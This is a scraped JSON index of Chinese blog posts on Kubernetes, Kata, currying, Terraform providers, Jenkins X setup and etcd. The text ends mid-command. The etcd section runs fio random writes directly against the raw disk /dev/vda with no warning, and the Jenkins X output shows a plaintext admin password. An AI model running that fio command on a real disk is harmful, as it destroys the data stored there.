https://ustack.io/2019-11-21-container%E7%9B%B8%E5%85%B3%E6%A6%82%E5%BF%B5%E6%A2%B3%E7%90%86.html https://github.com/kata-containers/documentation/blob/master/how-to/how-to-use-k8s-with-cri-containerd-and-kata.md https://github.com/kubernetes/kubernetes/issues/73189 https://blog.zufardhiyaulhaq.com/kubernetes-with-cri-containerd-and-kata-containers/ ","description":"","id":285,"section":"post","tags":["博文","Kubernetes","Kata","Containers"],"title":"如何在 Kubernetes 集群集成 Kata","uri":"https://www.chenshaowen.com/blog/how-to-integrate-kata-in-kubernetes-cluster.html"},{"content":"1. 什么是柯里化 根据维基百科词条定义，在计算机科学中，柯里化（Currying）是把接受多个参数的函数转变成接受一个单一参数（最初函数的第一个参数）的函数，并且返回接受余下的参数而且返回结果的新函数的技术。\n英文版定义是一个两层的定语从句，翻译过来断句太长，上面的定义有些绕口。这里有几个关键点：\n多个参数转变成单一参数 接受余下参数 返回一个新函数 用表达式表示就是：\nf(x, y, z, ...) =\u0026gt; f(x)(y)(z)... 使用单一参数链式调用，替代多个参数调用。\n2. 柯里化的用途 在函数式编程中，我们经常会写一些功能类似，参数不同的代码。由于没有继承或泛型，项目中会产生很多冗余的代码，难以维护。\n柯里化能解决上面的问题。从定义可以看到，柯里化是用来生成函数。通过柯里化，能够简化函数的调用，编写更容易理解的代码。\n在实现上，由于需要返回有状态的匿名函数，需要借助闭包实现，同时又涉及链式调用，需要借助递归函数实现。虽然在使用上很简单，但是编写一个 curry 函数并不简单。\n3. 柯里化示例 下面是一段 JavaScript 的柯里化用例:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 function curry(func) { return function curried(...args) { if (args.length \u0026gt;= func.length) { return func.apply(this, args); } else { return function(...args2) { return curried.apply(this, args.concat(args2)); } } }; } function sum(a, b, c) { return a + b + c; } let curriedSum = curry(sum); alert(curriedSum(1)(2)(3)) 在浏览器的 Console 中执行上面的代码，会弹框 6 ，执行 curriedSum(1, 2, 3) , curriedSum(1)(2,3) 也会得到同样的结果。\n这段代码的逻辑是，比较 curried 实参和 sum 函数形参长度的大小，当实参少于形参时，递归调用继续增加实参数量，比如 (1) -\u0026gt; (1, 2)。直到实参为 (1, 2, 3) ，长度等于 sum 函数形参时，调用 sum 函数。\n4. 与偏函数的区别 偏函数用表达式表示就是：\n1 f(x, y, z, ...) =\u0026gt; f(a, y, z, ...) Python 提供了 functools.partial 函数，用于冻结参数。冻结部分参数，是偏函数的显著特征。看下面的示例：\n1 2 3 4 5 6 7 8 9 from functools import partial def join_string(*args): return \u0026#39;_\u0026#39;.join(args) ok_join = partial(join_string, \u0026#39;ok\u0026#39;) print(ok_join(\u0026#39;a\u0026#39;)) # ok_a error_join = partial(join_string, \u0026#39;error\u0026#39;) print(error_join(\u0026#39;a\u0026#39;)) # error_a 上面的示例，通过偏函数，也可以生成各种功能类似的函数。这在工程中也有着十分广泛的应用场景，比如有很多的功能模块需要打印日志，通过偏函数就可以为每一个功能模块生成一个 logger 。这样既能够解耦各个模块，还增加了代码的可读性，DevOpsLogger 、IstioLogger 、IamLogger 等。\n5. 参考 https://zh.wikipedia.org/wiki/%E6%9F%AF%E9%87%8C%E5%8C%96 https://javascript.info/currying-partials ","description":"","id":286,"section":"post","tags":["博文","Go","Python","柯里化","函数式编程","偏函数"],"title":"柯里化与偏函数","uri":"https://www.chenshaowen.com/blog/curry-and-partial-function.html"},{"content":"1. Terraform Vs Kubernetes 基础架构即代码（Iac) 基于不可变的基础架构，使用编排工具将基础架构文本化，允许像管理代码一样管理基础设施。\n2018 年，我在从事 SaaS 开发，使用 Kubernetes 平台进行部署，这一年 Terraform 很火。2019 年，我开始从事 Kubernetes 的二次开发，才听说 Terraform 。现在网上 Terraform 相关的文档增量已经很少，更多是 Kubernetes 。\n为什么我开始关注 Terraform ？因为测试 Kubernetes 经常需要创建大量集群。手工在 IaaS 的 GUI 创建 VM ，登陆部署是最低效的方式。我也尝试过使用 Jenkins 流水线部署 Kubernetes ，这得维护一台可靠的服务器。最后就关注到了 Terraform 。\nTerraform 承载的是平台，而 Kubernetes 承载的是应用。\n存储平台、监控平台、PaaS 平台、依赖于 Kubernetes 的平台、DevOps 平台等，需要考虑使用 VM 进行部署，减少架构上的复杂度，而用户服务的负载可以直接使用 Kubernetes 进行部署。目前，使用和运维 Kubernetes 的门槛并没有很低，强行 All in Kubernetes 而运维能力没有跟上，会导致更棘手的问题。以前服务只是慢，现在服务打不开 。\n2. Terraform 的运行机制 编排工具的核心是定义一种 DSL 语言，用户使用 Outer DSL 语言描述流程，而编排工具实现 Inner DSL 对其解析，转换为具体执行动作。如下图：\nTerraform 的 Outer DSL 是提供给用户编写的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 provider \u0026#34;cloud\u0026#34; { secret_id = \u0026#34;\u0026#34; secret_key = \u0026#34;\u0026#34; region = \u0026#34;\u0026#34; } data \u0026#34;cloud_image\u0026#34; \u0026#34;myimage\u0026#34; { os_name = \u0026#34;centos\u0026#34; ... } resource \u0026#34;cloud_instance\u0026#34; \u0026#34;my_app\u0026#34; { instance_name = \u0026#34;app1\u0026#34; ... } Terraform 的 Inner DSL 是开发者使用 Golang 实现的，由两部分组成，Core 和 Plugins 。Core 通过 RPC 与 Plugins 进行通信。\nPlugins 插件负责领域实现，提供 Provider 。Core 负责解析 Outer DSL 、管理资源、管理构建、执行 plan。如下图：\n3. 如何发布 Provider Provider 主要是对领域的封装，直白点就是实现对 IaaS API 的封装。基于 Terraform 提供的 schema.Provider 实现鉴权、基于 schema.Resource 实现对 IaaS 资源的 CRUD 即可。\nhttps://registry.terraform.io/ 提供了类似 DockerHub 的托管功能，在页面上可以找到相关基础设施的 Provider 和 Modules 。Provider 通常就是 IaaS ，Modules 就是基于 Provider 的一个组件、应用等。\n首先需要将 Provider 发布到 Github Release 。 主要分为如下几个步骤：\n安装 goreleaser ，配置 .goreleaser.yml 直接拷贝 terraform-provider-scaffolding 中的 .goreleaser.yml 文件到项目根目录下。goreleaser 用于项目的发布，可以同时编译多个系统版本，并发布到 GitHub 上。\n配置 GPG_FINGERPRINT 没有配置 GPG 的可以参考这篇文档，GPG 验证提交 。查看环境中的 GPG 全部秘钥：\n1 2 3 gpg --list-keys xxx(YOUR_GPG_ID) 设置环境变量：\n1 export GPG_FINGERPRINT=xxx(YOUR_GPG_ID) GPG_FINGERPRINT 指向了你所使用的某条 GPG 秘钥，也是下面需要在注册页面上输入的内容。\n设置 GITHUB_TOKEN 打开 Github 的个人 配置页面 页面，勾选 public_repo 权限，生成 Token 之后：\n1 export GITHUB_TOKEN=xxx 仓库打标签 1 git tag v1.2.6 发布 Release 版本 1 goreleaser release --rm-dist 最后在 Github 页面上看到是这样的效果：\n如果使用 Github Action 自动进行发布，可以增加一个文件 `` :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 name: goreleaser on: push: tags: - \u0026#39;v*\u0026#39; jobs: goreleaser: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v2 with: fetch-depth: 0 - name: Set up Go uses: actions/setup-go@v2 with: go-version: 1.14 - name: Import GPG key id: import_gpg uses: crazy-max/ghaction-import-gpg@v2 env: GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }} - name: Run GoReleaser uses: goreleaser/goreleaser-action@v2 with: version: latest args: release --rm-dist env: GITHUB_TOKEN: ${{ secrets.RELEASE_TOKEN }} GPG_FINGERPRINT: ${{ steps.import_gpg.outputs.fingerprint }} RELEASE_TOKEN 就是上面的 GITHUB_TOKEN 值，而 GPG_PRIVATE_KEY 为下面命令的输出值：\n1 2 3 gpg --list-keys xxx(YOUR_GPG_ID) gpg --export-secret-keys --armor xxx(YOUR_GPG_ID) 然后准备好 GPG 秘钥，在 https://registry.terraform.io/ 页面上，使用 Github 账户登陆，选择 Provider 仓库，发布一个 Provider 。发布之后的效果如下： 4. 如何使用 Provider Iac 应用 在目录下新增三个文件，var.tf 、platform.tf 、install.sh 。内容大致如下:\nvar.tf , 定义 provider 和全局变量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 terraform { required_providers { qingcloud = { source = \u0026#34;shaowenchen/qingcloud\u0026#34; version = \u0026#34;1.2.6\u0026#34; } } } variable \u0026#34;access_key\u0026#34; { default = \u0026#34;yourID\u0026#34; } variable \u0026#34;secret_key\u0026#34; { default = \u0026#34;yourSecret\u0026#34; } variable \u0026#34;zone\u0026#34; { default = \u0026#34;pek3a\u0026#34; } provider \u0026#34;qingcloud\u0026#34; { access_key = \u0026#34;${var.access_key}\u0026#34; secret_key = \u0026#34;${var.secret_key}\u0026#34; zone = \u0026#34;${var.zone}\u0026#34; } platform.tf ，定义 IaaS 相关的资源。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 resource \u0026#34;qingcloud_eip\u0026#34; ... resource \u0026#34;qingcloud_security_group\u0026#34; ... resource \u0026#34;qingcloud_security_group_rule\u0026#34; ... resource \u0026#34;qingcloud_keypair\u0026#34; ... resource \u0026#34;qingcloud_instance\u0026#34; ... resource \u0026#34;null_resource\u0026#34; \u0026#34;install_platform\u0026#34; { provisioner \u0026#34;file\u0026#34; { destination = \u0026#34;./install.sh\u0026#34; source = \u0026#34;./install.sh\u0026#34; connection { type = \u0026#34;ssh\u0026#34; user = \u0026#34;root\u0026#34; host = \u0026#34;${qingcloud_eip.init.addr}\u0026#34; private_key = \u0026#34;${file(\u0026#34;~/.ssh/id_rsa\u0026#34;)}\u0026#34; port = \u0026#34;22\u0026#34; } } provisioner \u0026#34;remote-exec\u0026#34; { inline = [ \u0026#34;sh install.sh\u0026#34; ] connection { type = \u0026#34;ssh\u0026#34; user = \u0026#34;root\u0026#34; host = \u0026#34;${qingcloud_eip.init.addr}\u0026#34; private_key = \u0026#34;${file(\u0026#34;~/.ssh/id_rsa\u0026#34;)}\u0026#34; port = \u0026#34;22\u0026#34; } } install.sh ，在指定的 IaaS 上安装平台应用。也可以将其封装成 module ，会更加清晰。\n1 2 #!/usr/bin/env bash # install your application 这些基础设施相关的配置文件，都需要使用 Git 进行存储和管理。每次需要创建时，只需要克隆下来，进入目录：\n1 2 terraform init terraform apply 即可创建对应的平台应用。而执行 terraform destroy 即可销毁创建的全部资源。\n5. 参考 https://github.com/shaowenchen/terraform-provider-qingcloud ","description":"","id":287,"section":"post","tags":["博文","Terraform","Iac","Kubernetes","DevOps","CICD","研发"],"title":"如何使用 Terraform Provider 提供 Iac 级别的应用","uri":"https://www.chenshaowen.com/blog/how-to-use-terraform-to-provide-iac-platform.html"},{"content":"1. 钱少事多受人欺 运维部门是成本部门。有个词叫，成本优化。CXO 看到机器的负载这么低，就会想着裁撤机器，能少花就少花点，运维也就来活儿了。优化成本是运维的职责之一。\n运维是研发的服务团队。不能够创造营收，就意味着没有话语权，运维在公司的地位可想而知。更多的是研发提需求，运维去完成，没有太多商量的余地。\n一个显著的特征是，外包运维的公司比外包研发的公司多很多。这也很容易理解，运维通常是首次搭建好之后，后续没有太多需求，属于长尾项目。而只要业务系统有人在用，研发就需要不断地迭代系统，支撑公司营收业务。\n另外，研发分得很细，Web 研发、App 研发、Golang 研发，不是随便招聘一个研发就可以快速上手干活。运维却不同，一个 Shell 基本可以解决问题，会写 Python 就非常不错了。\n2. 虚拟容器拔地起 基于物理机的 IT 基础架构资源利用率低、运维成本高、容灾备份困难，这加速了虚拟化技术、容器技术的发展。\n虚拟化技术出现得很早，上世纪 80 年代就用于解决大型机分时复用的问题。chroot 、cgroup、lxc 等技术逐渐浮现。其实虚拟化技术，也分为全虚拟化和半虚拟化。半虚拟化效率高，但是需要对运行的 OS 内核进行修改。现在很多 IaaS 云厂商使用的是全虚拟化 QEMU-KVM 技术栈。\n基于虚拟机构建的 IT 基础设置，让运维人员摆脱了物理机房的束缚，不用花太多时间关注硬件。范围缩小了，运维质量也就上去了。\n事情还没完，还需要解决 CentOS、Ubuntu、Red Hat 等各种系统差异，而且基于虚拟机还是跑不了几个应用。相较于虚拟机具有独立完整内核，容器只是运行在宿主机上的一组进程，使用 lxc 等技术实现与系统之间的隔离。看着是个不错的技术，就是用的人不多，因为这玩意不好理解。\n随着 2013 年 Docker 的出现，这种状况发生了改变。Docker 最大的贡献在于，制定了容器镜像规范，普及了容器技术。现在提到容器，大家很容易想到的就是 Docker ，其实还有 containerd、cri-o、isula ，他们都遵循 OCI 规范。Docker 的口号是 \u0026ldquo;Build once, Run anywhere, Configure once, Run anything\u0026rdquo; 。没错，Docker 屏蔽了底层的差异，有点像 JVM ，提供了一个中间层。\nDocker 的普及，意味着运维的春天不远了。虚拟化技术让运维不用关注硬件，Docker 让运维不用关注应用。运维只需要基于 Docker 展开运维工作即可，采集监控指标、日志，配置告警等。\n3. 敏捷开发少不了 敏捷开发发展于极限编程，是很重要的方法论。DevOps 被泛化，一千个人可能有一千个不同的解读，可以将其理解为一场 IT 文化运动。关于敏捷开发的内容，可以参考另外一篇文档 敏捷开发之研发流程 。\nDevOps 正式出现，是在 2009 年。之后逐渐发展，历经十多年依然很受关注。\n技术的出现可能很偶然，但技术的发展是需要市场培育的。最初的软件应用开发，需要很深入的理解计算机，相关的工具欠缺，复杂度降不下来，开发周期得按照月、年来算。现在不同了，互联网公司每周都有几次发布，而且一次发布的应用数量不少。\n在这种需求端发生变化的情况下，促使了技术、文化的演变和发展，而这都基于容器技术。容器技术提供了隔离、弹性、随时创建、随时销毁的特征。较于难以理解的 Linux 系统行为，Docker 相关的概念简单太多，好用又好学，船还大，这简直就是技术人员的福音。\n为了方便管理和监控，我们通常采用一个应用一个容器的模型。但微服务架构下，上百个应用，就得有上百个容器。管理这些容器，控制他们的启动顺序、运行位置、副本数量等都会面临巨大挑战。为此，容器编排成为了一个非常强烈的需求。\n在容器编排大战之后，Kubernetes 成为了事实上的云原生基础设施，面向应用的分布式操作系统。随后，相关的技术像雨后春笋般涌现，微服务治理的 Istio ，编排任务的 Tekton ，提供无服务的 Knative 等等。\n一花开后，百花开。有了 Docker 在前开路，我们进入了一个 IT 基础设施全面大发展的时代。\n4. 站在枝头唧喳喳 前面说了这么多，好像没怎么提云原生。处于快速发展阶段的技术，概念上都有点捋不清。根据 CNCF 的定义，云原生应用就是使用容器、服务网格、微服务、不可变基础设施和声明式 API 等技术构建的应用。简单点就是，用 CNCF 内的项目。\n从没见过哪个行业像 IT 行业这么热爱分享，更何况是一群以前没什么地位、大家都不愿意干的运维主导的。CNCF 每年都会举办云原生技术峰会 KubeCon 。\n很多主题内容都是围绕 Kubernetes 进行的。Kubernetes 作为基础设置，替代了 OS\\VM ，也就意味着之前所有的基础应用都需要往 Kubernetes 上迁移。除此，在使用 Kubernetes 的过程中，也会催生新的场景。\n在未凝固的水泥路面上行走，才会永久留下脚印。Kubernetes 相关的生态就是一条这样的路面。而你需要做的，可能只是写一个 operator ，对接你擅长的领域。\n","description":"","id":288,"section":"post","tags":["博文","思考","云原生"],"title":"现在是云原生最好的时代","uri":"https://www.chenshaowen.com/blog/the-best-era-of-cloud-native.html"},{"content":"1. Jenkins X 简介 Jenkins 依靠庞大的插件生态，占据了目前大部分的企业级 CICD 引擎的份额。但在云原生时代，Jenkins 也暴露出很多的问题，单点服务、磁盘存储、内存占用等。\nJenkins X 围绕 Kubernetes，提供了一种更适合云原生时代的 DevOps 方式。Jenkins X 不是 Jenkins 的发行版本，准确来说，Jenkins X 是一个应用发布部署的技术栈。\n在研发方面，通过 jx 命令，开发者可以新建仓库、生成应用脚手架、运行流水线、发布部署，最终运行在 Kubernetes 上。Jenkins X 给开发者提供了非常一致的开发体验。\n在部署方面，通过 Terraform 提供的能力，可以在主流云厂商上直接创建集群。除此，Jenkins X Environment 还提供了对多环境的支持，通过定义环境之间的升级规则，各个环境上的应用可以很方便地进行发布、回滚、迁移。Jenkins X 给运维人员带来了极大便利。\n一句话，Jenkins X 是面向云原生的一站式 DevOps 技术栈。\n2. 架构和原理 设计架构：\n概念模型：\n上面两张图来自 Jenkins X 官网，通过这两张图可以很快了解 Jenkins X 在做什么，想做什么。Jenkins X 针对的是多环境多版本的多人团队，提供基于 Kubernetes 的应用开发、部署服务。\n下面这张图提供了相关组件的概览：\nGitOps - 通过 Git 提交变更、使用 PR 进行授权的资源管理思想。\n数据存储 - Git Repo。GitOps 驱动着 Jenkins X 。Jenkins X 对基础设施、配置、应用的所有变更，都记录在 Git Repo 中。当有 Git 事件发生时，触发 Jenkins X 执行。Jenkins X 只需要关注 Webhook 事件，仅当有 Git 事件发生时，才会动态创建 Pod 执行相应动作。\n事件驱动 - Prow/Lighthouse 。Kubernetes 使用 Prow 用于 ChatOps ，通过标签语义，可以驱动研发流程。但 Prow 严重依赖于 Github ，很难对其他 SCM 进行扩展，为此产生了 Lighthouse 项目。\n应用开发 - Draft/Skaffold 。针对开发者，在 Kubernetes 上开发云原生应用的工具。通过 Draft/Skaffold 完成对应用的初始化、部署，开发者可以很方便地迭代应用代码，在本地或远程 Kubernetes 集群中进行验证。\n发布管理 - Helm 。一款对 Kubernetes 应用进行管理的工具，类似 CentOS 上的 Yum ，Ubuntu 上的 Apt 。使用 Helm 可以实现对应用的部署、升级、回退、删除操作。\n流程编排 - Jenkins/Tekton/Knative 。Tekton 通过 Kubernetes CRD 定义流水线的 CICD 系统。在旧的版本中，可以使用 Jenkins 作为编排引擎，但是 Jenkins X 从今年 3 月份开始已经转向 Tekton 。Tekton 是 Knative 的 build-pipeline 项目前身。Knative 提供了对任务的处理和管理能力。\n包管理仓库 - Nexus 。支持许多主流的软件包格式，Docker、npm、Yum、Maven 等。\n3. 在 Kubernetes 上安装 Jenkins X 通过 jx create cluster 命令，使用 Terraform 可以直接创建集群，将集群作为配置信息进行管理。\n最新的 Jenkins X （2.1.132）推荐使用 jx boot 命令进行安装，支持 GKE，EKS ，其他 Kubernetes 需要自行检查兼容性。这里是 Jenkins X on Kubernetes 兼容性对照表。我在自建的集群上尝试了下，坑还比较多，可以再等等，或者给社区提交 PR 。下面使用 jx install 命令进行安装。\n3.1 安装要求 Kubernetes 版本 \u0026gt; 1.8 1 2 3 4 kubectl version Client Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;16\u0026#34;, GitVersion:\u0026#34;v1.16.13\u0026#34;, GitCommit:\u0026#34;39a145ca3413079bcb9c80846488786fed5fe1cb\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-07-15T16:18:19Z\u0026#34;, GoVersion:\u0026#34;go1.13.9\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} Server Version: version.Info{Major:\u0026#34;1\u0026#34;, Minor:\u0026#34;16\u0026#34;, GitVersion:\u0026#34;v1.16.13\u0026#34;, GitCommit:\u0026#34;39a145ca3413079bcb9c80846488786fed5fe1cb\u0026#34;, GitTreeState:\u0026#34;clean\u0026#34;, BuildDate:\u0026#34;2020-07-15T16:10:14Z\u0026#34;, GoVersion:\u0026#34;go1.13.9\u0026#34;, Compiler:\u0026#34;gc\u0026#34;, Platform:\u0026#34;linux/amd64\u0026#34;} 确认开启 RBAC 1 2 3 kubectl cluster-info dump | grep authorization-mode \u0026#34;--authorization-mode=Node,RBAC\u0026#34;, 配置有默认的 Storage Class 1 2 3 4 kubectl get sc NAME PROVISIONER AGE local (default) openebs.io/local 2m 集群 Master 节点 CPU 最少 4 C 3.2 安装 jx、Git 客户端 安装 Jenkins X 客户端 这里没有使用 2.x 的版本，而是使用的最后一个 1.x 版本。在后面的文档中，我会继续关注相关的演变。\n1 2 curl -L https://github.com/jenkins-x/jx/releases/download/v1.3.1119/jx-linux-amd64.tar.gz | tar xzv mv jx /usr/local/bin 查看版本：\n1 2 3 4 5 6 7 8 9 10 11 jx version NAME VERSION jx 1.3.1119 jenkins x platform 2.0.2375 Kubernetes cluster v1.16.13 kubectl v1.16.13 helm client v2.16.10+gbceca24 helm server v2.16.10+gbceca24 git git version 2.24.1 Operating System CentOS Linux release 7.6.1810 (Core) 安装 Git 2.x 如果使用 Git 1.x 的版本，可能会遇到类似下面的错误：\n1 FATAL: initialise build packs failed: there was a problem ensuring the branch master has tracking info: git output: error: pathspec \u0026#39;master\u0026#39; did not match any file(s) known to git.: failed to run \u0026#39;git checkout master\u0026#39; command in directory \u0026#39;/root/.jx/draft/packs/github.com/jenkins-x-buildpacks/jenkins-x-kubernetes\u0026#39;, output: \u0026#39;error 解决办法是，进入提示目录，手工拉取。\n1 2 cd /root/.jx/draft/packs/github.com/jenkins-x-buildpacks/jenkins-x-kubernetes git pull 更好的方法是，升级 Git 的版本至 2.x ，下面以 CentOS 7 为例：\n1 2 3 4 5 6 yum remove git* yum -y install https://packages.endpoint.com/rhel/7/os/x86_64/endpoint-repo-1.7-1.x86_64.rpm yum install -y git git version git version 2.24.1 3.3 测试集群是否满足要求 在安装完 jx 命令之后，可以使用下面的命令进行检测：\n1 jx compliance run 1 jx compliance status 大约需要运行几十分钟，运行下面的命令可以看到最终的执行结果:\n1 jx compliance results 最后删掉相关负载:\n1 jx compliance delete 3.4 安装 Jenkins X 服务端 Jenkins X 内置的服务组件依赖 Ingress ，可以根据文档 使用 Helm 安装 Ingress 提前安装。\n开始安装 1 jx install --verbose 接着会有一系列交互：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ? Cloud Provider kubernetes ... \u0026gt; [x] helm [x] kubectl ... ? Please enter the name you wish to use with git: shaowenchen ? Please enter the email address you wish to use with git: mail@chenshaowen.com ... ? Would you like wait and resolve this address to an IP address and use it for the domain? Yes ... ? Domain dev.chenshaowen.com ... ? github.com username: shaowenchen ... Please click this URL and generate a token https://github.com/settings/tokens/new?scopes=repo,read:user,read:org,user:email,write:repo_hook,delete_repo ? API Token: ***************************************** ? Select Jenkins installation type: Serverless Jenkins ? Pick default workload build pack: Kubernetes Workloads: Automated CI+CD with GitOps Promotion Jenkins X installation completed successfully INFO[0094] ******************************************************** NOTE: Your admin password is: Sr5!8LZz!QfMD84KBZWR ******************************************************** 设置 Ingress Controller 如果使用 Jenkins X 提供的 Ingress Controller 则需要提供 LB 或者手工增加 externalIPs 。下面将 externalIPs 设置为机器 eth0 的 IP ，绑定 EIP 之后，将域名解析到 EIP 即可访问服务。\n1 2 3 4 5 kubectl -n kube-system edit svc jxing-nginx-ingress-controller spec: externalIPs: - 192.168.13.74 查看服务 1 2 3 4 5 6 kubectl get ingress -n jx NAME HOSTS ADDRESS PORTS AGE chartmuseum chartmuseum.jx.dev.chenshaowen.com 192.168.13.74 80 2m docker-registry docker-registry.jx.dev.chenshaowen.com 192.168.13.74 80 2m nexus nexus.jx.dev.chenshaowen.com 192.168.13.74 80 2m 如果没有可控的公网域名，在安装过程中，可以选择 nip.io 提供的域名，通过本地配置 hosts 进行访问:\n1 2 3 x.x.x.x chartmuseum.jx.192.168.13.74.nip.io x.x.x.x docker-registry.jx.192.168.13.74.nip.io x.x.x.x nexus.jx.192.168.13.74.nip.io 3.6 安装插件 Jenkins X 通过 Helm Chart 管理插件和应用，在 jenkinx-x/jx 仓库中可以查看已经集成的插件。通过 jx 命令，可以很方便地安装相关的插件，下面是部分插件列表。\nambassador - Create an ambassador addon anchore - Create the Anchore addon for verifying container images environment - Create an Environment Controller to handle webhooks and promote changes from GitOps flagger - Create the Flagger addon for Canary deployments gitea - Create a Gitea addon for hosting Git repositories gloo - Create a Gloo and Knative Serve addon for creating serverless applications ingress - Create an Ingress Controller to expose services outside of your remote Staging/Production cluster istio - Create the Istio addon for service mesh kubeless - Create a kubeless addon for hosting Git repositories owasp-zap - Create the OWASP Zed Attack Proxy addon for dynamic security checks against running apps pipeline-events - Create the pipeline events addon prometheus - Creates a prometheus addon prow - Create a Prow addon 这里安装 Prow 用于 ChatOps\n1 jx create addon prow -n jx 1 2 3 4 5 6 7 8 9 kubectl get ingress -n jx NAME HOSTS ADDRESS PORTS AGE chartmuseum chartmuseum.jx.dev.chenshaowen.com 192.168.13.74 80 2m deck deck.jx.dev.chenshaowen.com 192.168.13.74 80 2m docker-registry docker-registry.jx.dev.chenshaowen.com 192.168.13.74 80 2m hook hook.jx.dev.chenshaowen.com 192.168.13.74 80 2m nexus nexus.jx.dev.chenshaowen.com 192.168.13.74 80 2m tide tide.jx.dev.chenshaowen.com 192.168.13.74 80 2m 3.5 卸载 Jenkins X 1 2 jx uninstall rm -rf /root/.jx 4. Jenkins X 使用 4.1 环境管理 查看环境 1 2 3 4 5 6 jx get env NAME LABEL KIND PROMOTE NAMESPACE ORDER CLUSTER SOURCE REF PR dev Development Development Never jx 0 staging Staging Permanent Auto jx-staging 100 https://github.com/shaowenchen/environment-antdisco-staging.git production Production Permanent Manual jx-production 200 https://github.com/shaowenchen/environment-antdisco-production.git Jenkins X 在 Git Repo 中对基础设置进行存储，通过 PR 进行修改管理。\n删除环境 1 jx delete env dev 创建环境 1 jx create env env-name 4.2 应用开发 创建应用 1 2 3 4 5 6 7 8 jx create quickstart ? Do you wish to use shaowenchen as the Git user name? Yes ? Which organisation do you want to use? shaowenchen ? Enter the new repository name: jx-quickstart-demo ? select the quickstart you wish to create jx-quickstart-demo INFO[0035] Pushed Git repository to https://github.com/shaowenchen/jx-quickstart-demo INFO[0051] Creating GitHub webhook for shaowenchen/jx-quickstart-demo for url http://hook.jx.dev.chenshaowen.com/hook 也可以直接从线上或者本地导入应用\n1 jx import --url https://github.com/shaowenchen/jx-quickstart-demo.git 在页面上可以看到初始化的仓库和 Webhook 配置信息。\n5. 参考 https://github.com/jenkins-x/jx https://jenkins-x.io/zh/docs/getting-started/setup/install/ https://jenkins-x.io/commands/jx/#jx https://www.weave.works/blog/gitops-operations-by-pull-request https://jenkins-x.io/docs/resources/guides/managing-jx/old/install-on-cluster/ ","description":"","id":289,"section":"post","tags":["博文","技术栈","Jenkins","Jenkins-X","DevOps","CICD","Terraform"],"title":"Jenkins X 不是 Jenkins ，而是一个技术栈","uri":"https://www.chenshaowen.com/blog/jenkins-x-is-not-jenkins-but-stack.html"},{"content":"1. Etcd 基本介绍 Etcd 是一个分布式 Key/Value 的存储系统，通过分布式锁、leader 选举、写屏障(write barriers) 实现了分布式协作，提供高可用、持久化数据存储和检索服务。\n工作原理 每个 Etcd 节点都存储了一份完整的数据，任意时刻至多存在一个主节点。主节点处理所有来自客户端的写请求，并且通过 Raft 协议同步到其他节点。\n存储原理 Etcd 数据持久化使用 WAL (write ahead log，预写式日志) 格式，在提交之前先写入 WAL，默认每 1W 条记录，做完快照之后，WAL 文件会被删除。\nEtcd 在内存中，以 B 树对 Key 值建立索引，在磁盘中，以 B+ 树对 Value 进行存储记录历史版本。\n2. Etcd 节点数要求 Etcd 节点越多，容错能力越强，写性能越差。官方推荐的 etcd 集群节点数量为 3，5，7。Etcd 集群最少需要 [N/2] + 1 个节点工作，才能保证集群正常。下面是集群节点数和最大容错节点数量对应表：\n节点数 最大容错 1 0 3 1 4 1 5 2 6 2 7 3 8 3 9 4 奇数个节点与偶数个节点，具有相同的容错能力。\n3. 硬件环境要求 3.1 限制 Etcd 性能的因素 Etcd 对内存和 CPU 消耗并不高，足够就行。\n一次 Etcd 请求的最小时间 = 成员节点之间的网络往返时延 + 收到数据之后进行持久化的时延。因此，Etcd 的性能主要受两方面的约束：\n网络 磁盘 多节点的 Etcd 集群成员节点应该尽量部署在同一个数据中心，减少网络时延。同一数据中心内，不同节点的网络情况通常是非常好的，如果需要测试可以使用 ping 或 tcpdump 命令进行分析。下面主要讨论看看推荐的配置和硬盘 IO 测试方法。\n3.2 CPU、内存建议配置 Cluster Node Data Size vCPUs Memory (GB) Max concurrent IOPS Disk bandwidth (MB/s) 50 no more than 100 MB 2 8 3600 56.25 250 no more than 500 MB 4 16 6000 93.75 1000 no more than 1 GB 8 32 8000 125 3000 more than 1 GB 16 64 16,000 250 3.3 硬盘 IOPS 测试方法 Etcd 对磁盘写入延时非常敏感，通常要求达到 50 IOPS 以上，对于高负载的集群应该达到 500 IOPS 。常用的磁盘基准测试工具 diskbench 、 fio 。这里以 CentOS 上使用 fio 为例：\n查看磁盘信息 1 2 3 4 5 fdisk -l Disk /dev/vda: 107.4 GB, 107374182400 ... Disk /dev/vdb: 34.4 GB, 34359738368 安装 fio 1 yum install -y fio io 测试 1 2 3 fio -filename=/dev/vda -direct=1 -iodepth 64 -thread -rw=randwrite -ioengine=libaio -bs=4K -numjobs=8 -runtime=120 -group_reporting -name=test1 write: IOPS=1288, BW=5153KiB/s (5277kB/s)(605MiB/120206msec) 1 2 3 fio -filename=/dev/vda -direct=1 -iodepth 64 -thread -rw=write -ioengine=libaio -bs=512K -numjobs=8 -runtime=120 -group_reporting -name=test2 write: IOPS=102, BW=51.1MiB/s (53.6MB/s)(2453MiB/48023msec) 其中，filename 为测试设备，更多参数可以查看上面的 GitHub 链接。这里得到 IOPS 为 1288，磁盘带宽为 53.6 MB/s 。\n4. 安装 Etcdctl 1 2 3 4 5 6 7 8 9 10 export ETCD_VER=v3.4.10 export ETCD_DIR=etcd-download export DOWNLOAD_URL=https://github.com/coreos/etcd/releases/download mkdir ${ETCD_DIR} cd ${ETCD_DIR} wget ${DOWNLOAD_URL}/${ETCD_VER}/etcd-${ETCD_VER}-linux-amd64.tar.gz tar -xzvf etcd-${ETCD_VER}-linux-amd64.tar.gz cp etcd-${ETCD_VER}-linux-amd64/etcdctl /usr/local/bin/ 在使用 Etcdctl 过程中，需要节点证书。有两种方式提供证书：\n在命令行中 1 ETCDCTL_API=3 etcdctl 